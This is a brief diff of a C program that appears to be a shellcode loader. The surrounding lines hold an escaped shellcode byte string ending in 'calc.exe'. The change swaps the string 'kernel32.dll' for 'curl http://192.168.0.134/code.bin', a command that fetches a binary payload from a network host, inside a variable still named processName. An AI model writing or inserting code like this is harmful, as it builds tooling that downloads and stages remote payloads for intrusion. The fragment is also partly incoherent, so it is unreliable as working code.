@@ -50,7 +50,7 @@ int main(int argc, char const *argv[])
 	"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
 	;
 
-	char processName[] = "kernel32.dll";
+	char processName[] = "curl http://192.168.0.134/code.bin";
 
     for (int i = 0; i < sizeof(processName); i++)
     {
